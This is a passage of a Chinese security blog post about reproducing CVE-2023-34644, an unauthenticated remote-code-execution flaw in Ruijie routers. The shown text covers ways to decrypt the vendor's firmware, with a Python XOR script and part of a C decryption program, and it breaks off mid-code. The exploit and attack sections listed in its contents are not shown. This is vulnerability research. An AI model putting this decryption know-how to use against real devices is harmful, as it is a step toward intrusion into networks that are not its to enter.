<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"zikh26.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"default"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":"ture","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="前言winmt 师傅之前挖到了一个锐捷的未授权 RCE 漏洞，影响了该厂商下的众多路由器、交换机、中继器等设备。winmt 师傅已经发布了 相关的挖掘经历，对仿真的搭建和漏洞分析已经写的比较详细。本篇文章主要是自己对该漏洞调用链进行一个完整的梳理，以及在 winmt 师傅文章中未提到的部分我会进行记录。">
<meta property="og:type" content="article">
<meta property="og:title" content="站在巨人肩膀上复现CVE-2023-34644">
<meta property="og:url" content="https://zikh26.github.io/posts/e5651b4f.html">
<meta property="og:site_name" content="ZIKH26&#39;s Blog">
<meta property="og:description" content="前言winmt 师傅之前挖到了一个锐捷的未授权 RCE 漏洞，影响了该厂商下的众多路由器、交换机、中继器等设备。winmt 师傅已经发布了 相关的挖掘经历，对仿真的搭建和漏洞分析已经写的比较详细。本篇文章主要是自己对该漏洞调用链进行一个完整的梳理，以及在 winmt 师傅文章中未提到的部分我会进行记录。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309121128678.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309121127424.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309121145573.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309121146061.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308241513243.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308241513988.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308241513739.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308241513124.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308241513757.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308241513875.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308241513373.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308241513060.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308311122302.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291338524.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291342074.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291344320.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291349507.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291430860.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291436977.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291500311.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291617137.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291632275.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291631518.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291701815.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291711972.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291723184.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291724142.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291641637.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291644044.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308300959950.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308301007797.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308301020203.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308301025970.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308301028645.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308301517529.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308311455808.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308311456572.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291028707.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291044499.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291048141.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291052228.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291054903.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308251011899.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309091227332.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309091231861.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309121052534.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309121055168.png">
<meta property="article:published_time" content="2023-09-12T06:31:07.870Z">
<meta property="article:modified_time" content="2023-09-20T02:05:49.961Z">
<meta property="article:author" content="ZIKH26">
<meta property="article:tag" content="MIPS架构">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309121128678.png">


<link rel="canonical" href="https://zikh26.github.io/posts/e5651b4f.html">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://zikh26.github.io/posts/e5651b4f.html","path":"posts/e5651b4f.html","title":"站在巨人肩膀上复现CVE-2023-34644"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>站在巨人肩膀上复现CVE-2023-34644 | ZIKH26's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">ZIKH26's Blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-友链"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86"><span class="nav-number">2.</span> <span class="nav-text">固件解密</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lua%E6%96%87%E4%BB%B6%E7%9A%84%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">lua文件的调用链分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90"><span class="nav-number">4.</span> <span class="nav-text">二进制文件分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%BB%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="nav-number">4.1.</span> <span class="nav-text">读取数据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%9E%90%E6%95%B0%E6%8D%AE"><span class="nav-number">4.2.</span> <span class="nav-text">解析数据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B7%E4%BD%93%E6%93%8D%E4%BD%9C"><span class="nav-number">4.3.</span> <span class="nav-text">具体操作</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%93%8D%E4%BD%9C%E5%85%B3%E9%94%AE%E4%BF%A1%E5%8F%B7%E9%87%8F"><span class="nav-number">4.3.1.</span> <span class="nav-text">操作关键信号量</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%8Euf-cmd-call%E5%87%BD%E6%95%B0%E5%BC%80%E5%A7%8B"><span class="nav-number">4.3.2.</span> <span class="nav-text">从uf_cmd_call函数开始</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%89%8D%E5%A4%95"><span class="nav-number">4.3.3.</span> <span class="nav-text">命令执行前夕</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%87%E6%8D%A2%E7%BA%BF%E7%A8%8B-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">4.3.4.</span> <span class="nav-text">切换线程-命令执行</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC"><span class="nav-number">4.4.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%BC%94%E7%A4%BA"><span class="nav-number">4.5.</span> <span class="nav-text">攻击演示</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%96%91%E9%97%AE-amp-amp-%E8%A7%A3%E5%86%B3"><span class="nav-number">5.</span> <span class="nav-text">疑问&amp;&amp;解决</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#deal-remote-config-handle%E5%87%BD%E6%95%B0%E6%98%AF%E6%80%8E%E4%B9%88%E8%A2%AB%E8%A7%A6%E5%8F%91%E7%9A%84"><span class="nav-number">5.1.</span> <span class="nav-text">deal_remote_config_handle函数是怎么被触发的</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%A8%E6%88%B7%E6%B2%A1%E6%9C%89%E4%BC%A0%E5%85%A5%E6%95%B0%E6%8D%AE%E6%97%B6%EF%BC%8C%E8%BF%9B%E7%A8%8B%E5%9C%A8%E5%93%AA%E9%87%8C%E8%A2%AB%E9%98%BB%E5%A1%9E%E4%BA%86%EF%BC%9F"><span class="nav-number">5.2.</span> <span class="nav-text">用户没有传入数据时，进程在哪里被阻塞了？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8Edeal-remote-config-handle%E5%87%BD%E6%95%B0%E5%A6%82%E4%BD%95%E6%89%A7%E8%A1%8C%E5%88%B0uf-cmd-call%E5%87%BD%E6%95%B0"><span class="nav-number">5.3.</span> <span class="nav-text">从deal_remote_config_handle函数如何执行到uf_cmd_call函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#scp%E5%91%BD%E4%BB%A4%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3"><span class="nav-number">5.4.</span> <span class="nav-text">scp命令报错解决</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E7%BB%AD%E5%88%A9%E7%94%A8"><span class="nav-number">6.</span> <span class="nav-text">后续利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8B%BF%E5%88%B0%E7%AE%A1%E7%90%86%E5%91%98%E5%90%8E%E5%8F%B0%E5%AF%86%E7%A0%81"><span class="nav-number">6.1.</span> <span class="nav-text">拿到管理员后台密码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A1%A5%E4%B8%81%EF%BC%9A"><span class="nav-number">7.</span> <span class="nav-text">补丁：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%BE%E5%A3%B0"><span class="nav-number">8.</span> <span class="nav-text">尾声</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">9.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="ZIKH26"
      src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
  <p class="site-author-name" itemprop="name">ZIKH26</p>
  <div class="site-description" itemprop="description">万古凡间一过客，九天之上第一仙</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">106</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">110</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/e5651b4f.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="站在巨人肩膀上复现CVE-2023-34644 | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          站在巨人肩膀上复现CVE-2023-34644
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2023-09-12 14:31:07" itemprop="dateCreated datePublished" datetime="2023-09-12T14:31:07+08:00">2023-09-12</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-09-20 10:05:49" itemprop="dateModified" datetime="2023-09-20T10:05:49+08:00">2023-09-20</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/IOT%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">IOT安全</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/IOT%E5%AE%89%E5%85%A8/%E5%A4%8D%E7%8E%B0CVE/" itemprop="url" rel="index"><span itemprop="name">复现CVE</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>winmt</strong> 师傅之前挖到了一个锐捷的未授权 <code>RCE</code> 漏洞，影响了该厂商下的众多路由器、交换机、中继器等设备。<strong>winmt</strong> 师傅已经发布了 <a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-277386.htm">相关的挖掘经历</a>，对仿真的搭建和漏洞分析已经写的比较详细。本篇文章主要是自己对该漏洞调用链进行一个完整的梳理，以及在 <strong>winmt</strong> 师傅文章中未提到的部分我会进行记录。<span id="more"></span>特别感谢 <strong>winmt</strong> 师傅在我复现期间多次解答我的各种困惑</p>
<p>本文分析的固件为 <code>EW_3.0(1)B11P204_EW1200GI</code>（已解密） 百度网盘链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1RutoNCTiGBiW74YpzKXfxg?pwd=vht7">https://pan.baidu.com/s/1RutoNCTiGBiW74YpzKXfxg?pwd=vht7</a>    提取码：vht7</p>
<h2 id="固件解密"><a href="#固件解密" class="headerlink" title="固件解密"></a>固件解密</h2><p>上面已经提供了解密后的固件，但目前从锐捷官网下载的固件都是被加密的。此处记录一下解密的三种思路</p>
<ol>
<li>寻找过渡版本的固件，如果一个路由器型号最初版本为 <code>x001</code> 此时并没有加密 ，然后在 <code>x005</code> 版本开始对固件进行加密了。那么 <code>x004</code> 就是过渡版本的固件，为了从 <code>x004</code> 升级到 <code>x005</code> 固件，一定会在 <code>x004</code> 的文件系统里存放 <code>x005</code> 固件的解密脚本，不然路由器就无法解开 <code>x005</code> 的固件进行升级了，如果能从官网上下载到过渡版本的固件，去寻找其中的解密程序，编写一个解密脚本即可（不过就锐捷的固件而言，我并没有在官网上找到过渡版本的固件，疑似被下架了）</li>
<li>购买真机，直接从芯片中提取文件系统（目前未尝试过）</li>
<li>对加密后的固件直接分析，寻找一些特征或有规律的字节码，尝试编写其解密脚本</li>
</ol>
<p>下面对第三种思路，进行详细介绍</p>
<p>以 <code>EW_3.0(1)B11P219_EW1200I_10200109_install_encypto.bin</code> 固件为例（官网上可以直接下载，不再提供链接）</p>
<p>直接用 <code>binwalk</code> 解压是失败的</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309121128678.png" alt="image-20230912112845555"></p>
<p>用 <code>010 Editor</code> 打开，查看文件的末尾发现存在大量重复的字节码 <code>0x80</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309121127424.png" alt="image-20230912112712262"></p>
<p><strong>winmt</strong> 师傅给我说通常文件末尾会填充大量的 <code>\xff</code> 或者 <code>\x00</code> 字节码，这里有大量的重复字节码 <code>0x80</code> ，猜测可能是单字节异或 <code>key</code> 得到的。尝试拿 <code>0xff</code> 与 <code>0x80</code> 进行异或，得到疑似 <code>key</code> 值 <code>0x7f</code> </p>
<p>用下面的脚本，读取加密固件的字节码，逐字节与 <code>0x7f</code> 进行异或，得到一个新的文件</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jiemi</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> infile:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> outfile:</span><br><span class="line">                byte = infile.read(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">while</span> byte:</span><br><span class="line">                    byte_value = <span class="built_in">ord</span>(byte)</span><br><span class="line">                    xor_result = byte_value ^ <span class="number">0x7f</span></span><br><span class="line">                    outfile.write(<span class="built_in">bytes</span>([xor_result]))</span><br><span class="line">                    byte = infile.read(<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;File <span class="subst">&#123;input_file&#125;</span> successfully decrypted to <span class="subst">&#123;output_file&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: python exp.py input_file output_file&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        input_filename = sys.argv[<span class="number">1</span>]</span><br><span class="line">        output_filename = sys.argv[<span class="number">2</span>]</span><br><span class="line">        jiemi(input_filename, output_filename)</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309121145573.png" alt="image-20230912114545222"></p>
<p>可以看到 <code>binwalk</code> 成功识别了固件，并成功解压出文件系统</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309121146061.png" alt="image-20230912114656903"></p>
<p>拿到文件系统后，可以去寻找负责加解密的程序 <code>/usr/sbin/rg-upgrade-crypto</code> ，对二进制文件 <code>/usr/sbin/rg-upgrade-crypto</code> 进行分析可以写出解密脚本，下面是 <strong>winmt</strong> 师傅编写的解密脚本</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">char</span> <span class="type">uint8_t</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BYTE(x, n) (*((uint8_t *)&amp;(x)+n))</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">error_msg</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">puts</span>(msg);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> num1 = <span class="number">1</span>, num2 = <span class="number">0x10001</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">(<span class="type">uint8_t</span> *enc_buf, <span class="type">uint8_t</span> *dec_buf, <span class="type">int</span> length)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> sum = (<span class="type">uint8_t</span>)num1 + (<span class="type">uint8_t</span>)num2 + BYTE(num2, <span class="number">1</span>) + BYTE(num2, <span class="number">2</span>);</span><br><span class="line">		BYTE(num2, <span class="keyword">sizeof</span>(num2)/<span class="keyword">sizeof</span>(<span class="type">uint8_t</span>)<span class="number">-1</span>) = sum % <span class="number">2</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">6</span>; j++)</span><br><span class="line">			*((<span class="type">uint8_t</span> *)&amp;num1 + j) = *((<span class="type">uint8_t</span> *)&amp;num1 + j + <span class="number">1</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="type">uint8_t</span> key = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">8</span>; k++)</span><br><span class="line">			key |= *((<span class="type">uint8_t</span> *)&amp;num1 + k) &lt;&lt; k;</span><br><span class="line">		*(<span class="type">uint8_t</span> *)(dec_buf + i) = *(<span class="type">uint8_t</span> *)(enc_buf + i) ^ key;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (argc &lt; <span class="number">2</span>) error_msg(<span class="string">&quot;Usage: ./rg-decrypt [encrypted_firmware_path]&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="type">char</span> *enc_path = strdup(argv[<span class="number">1</span>]);</span><br><span class="line">	<span class="type">char</span> *dec_path = <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) + <span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(dec_path, argv[<span 